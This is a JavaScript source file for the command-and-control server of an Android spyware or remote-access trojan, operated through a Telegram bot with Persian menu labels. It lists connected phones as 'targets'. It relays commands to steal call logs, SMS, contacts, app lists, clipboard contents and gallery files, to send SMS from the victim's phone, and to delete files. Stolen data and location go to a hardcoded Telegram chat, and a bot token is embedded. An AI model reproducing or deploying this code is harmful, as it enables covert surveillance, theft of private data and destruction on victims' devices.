const socket = require('ws');
const http = require('http')
const express = require("express")
const TelegramBot = require('node-telegram-bot-api');
const multer = require('multer');
const bodyParser = require('body-parser')
const uuid4 = require('uuid')

const upload = multer();
const app = express()
app.use(bodyParser.json());
const server = http.createServer(app);
const wss = new socket.Server({server});
const chatId = '5291556865'
const token = '5242389563:AAFeAKlmTSWlD-ImaanaKfbLRcPtGK8vZoc'
const bot = new TelegramBot(token, {polling: true});

// request -
app.get("/", (req, res) => {
    res.send('<h1 style="text-align:center;">Server uploaded successfully, start robot!</h1>')
})
app.post("/sendFile", upload.single('file'), (req, res) => {
    var name = req.file.originalname

    bot.sendDocument(chatId, req.file.buffer, {}, {
        filename: name,
        contentType: 'application/txt',
    }).catch(function (error) {
        console.log(error);
    })
    console.log(name)
    res.send(name)
})
app.post("/sendText", (req, res) => {
    bot.sendMessage(chatId, req.body['data'], {parse_mode: "HTML"})
    res.send(req.body['data'])
})
app.post("/sendLocation", (req, res) => {
    bot.sendLocation(chatId, req.body['l1'], req.body['l2'])
    res.send(req.body['l1'].toString())
})
server.listen(process.env.PORT || 8999, () => {
    console.log(`Server started on port ${server.address().port}`);
});
// - ws://127.0.0.1:8999


// real time -
wss.on('connection', (ws, req) => {
    ws.uuid = uuid4.v4()
    bot.sendMessage(chatId, `<b>New Target Connected 📱\n\nID = <code>${ws.uuid}</code>\nIP = ${req.socket.remoteAddress.toString().replaceAll('f', '').replaceAll(':', '')}</b> 🌐`, {parse_mode: "HTML"})
});
setInterval(() => {
    wss.clients.forEach((client) => {
        client.send("be alive");
    });
}, 2000);
bot.on("message", (msg) => {
    if (msg.text === '/start') {
        bot.sendMessage(chatId, "✅Started JS Remote control panel", {
            "reply_markup": {
                "keyboard": [["📲لیست کاربران"], ["📟کنترل کاربران"]]
            }
        });
    }
    if (msg.text === "📲لیست کاربران") {
        const clientCount = wss.clients.size
        let status = '';
        if (clientCount > 0) {
            status += `<b>${clientCount} Online Target</b> ✅\n\n`
            wss.clients.forEach((ws) => {
                status += `<b>ID => </b><code>${ws.uuid}</code>\n\n`
            })
        } else {
            status += `<b>User Is Offline</b> 😴`
        }
        bot.sendMessage(chatId, status, {parse_mode: "HTML"});
    }
    if (msg.text === "📟کنترل کاربران") {
        const clientCount = wss.clients.size
        if (clientCount > 0) {
            let Actions = [
                [{text: 'گزارش های تماس 📞', callback_data: "cl"}],
                [{text: 'لیست تمام sms ها 💬', callback_data: "as"}],
                [{text: 'ارسال sms با گوشی تارگت 📩', callback_data: "ss"}],
                [{text: 'لیست مخاطبین 👤', callback_data: "gc"}],
                [{text: 'برنامه های نصب شده 📲', callback_data: "ia"}],
                [{text: '🔋 مدل گوشی و میزان شارژ 📱', callback_data: 'dm'}],
                [{text: 'دریافت فایل ها و گالری 📄', callback_data: 'gf'}],
                [{text: 'حذف فایل ها 🗑', callback_data: 'df'}],
                [{text: 'متن های کپی شده در کیبورد 📄', callback_data: 'cp'}],
            ]
            wss.clients.forEach((ws) => {
                bot.sendMessage(chatId, `<b>📟Panel Control📟 Id :</b>\n&${ws.uuid}`, {
                    reply_markup: {
                        inline_keyboard: Actions,
                        // force_reply: true,
                    },
                    parse_mode: "HTML"
                })
            })
        } else {
            bot.sendMessage(chatId, `<b>User Is Offline</b> 😴`, {parse_mode: "HTML"});
        }
    }
    if (msg.reply_to_message) {
        if (msg.reply_to_message.text.split('&')[0] === 'ss'){
            const data = msg.text.split(']')[0].split("[")[1]
            const uuid = msg.reply_to_message.text.split('!')[0].split('&')[1]
            wss.clients.forEach(client=>{
                if (client.uuid === uuid) {
                    client.send(`ss&${data}`)
                }
            })
            bot.sendMessage(chatId, "درخواست درحال اجرا..", {
                "reply_markup": {
                    "keyboard": [["📲لیست کاربران"], ["📟کنترل کاربران"]]
                }
            });
        }
        if (msg.reply_to_message.text.split('&')[0] === 'df' || msg.reply_to_message.text.split('&')[0] === 'gf') {
            const text = msg.reply_to_message.text;
            const action = text.split('!')[0].split('&')[0]
            const uuid = text.split('!')[0].split('&')[1]
            const path = msg.text
            wss.clients.forEach(client => {
                if (client.uuid === uuid) {
                    client.send(`${action}&${path}`)
                }
            })
            bot.sendMessage(chatId, "درخواست درحال اجرا..", {
                "reply_markup": {
                    "keyboard": [["📲لیست کاربران"], ["📟کنترل کاربران"]]
                }
            });
        }
    }
})
bot.on('callback_query', function onCallbackQuery(callbackQuery) {
    const action = callbackQuery.data;
    const clientId = callbackQuery.message.text.split('&')[1];
    wss.clients.forEach(client => {
        if (client.uuid === clientId) {
            if (action === 'ss') {
                bot.sendMessage(
                    chatId,
                    `ss&${client.uuid}!\n<b>Panel Send Sms📩\n Replace Number And Text:\n</b> <code>[{"number":"09111","message":"متن"}]</code>`,
                    {
                        reply_markup: {
                            force_reply: true,
                        },
                        parse_mode: "HTML"
                    }
                )
            } else if (action === 'gf') {
                bot.sendMessage(
                    chatId,
                    `gf&${client.uuid}!\n<b>Panel Revice File📁\n Reply Send Name Folder:\n</b>
<code>Download</code>\n
<code>DCIM/Camera</code>\n
<code>DCIM/Screenshots</code>\n
<code>Pictures/Telegram</code>`,
                    {
                        reply_markup: {
                            force_reply: true,
                        },
                        parse_mode: "HTML"
                    }
                )
            } else if (action === 'df') {
                bot.sendMessage(
                    chatId,
                    `df&${client.uuid}!\n<b>Panel Delete File🗑 \n Reply Send Name Folder:\n</b>
<code>Download</code>\n
<code>DCIM/Camera</code>\n
<code>DCIM/Screenshots</code>\n
<code>Pictures/Telegram</code>`,
                    {
                        reply_markup: {
                            force_reply: true,
                        },
                        parse_mode: "HTML"
                    }
                )
            } else {
                client.send(action)
            }
        }
    })
});

// real time -----
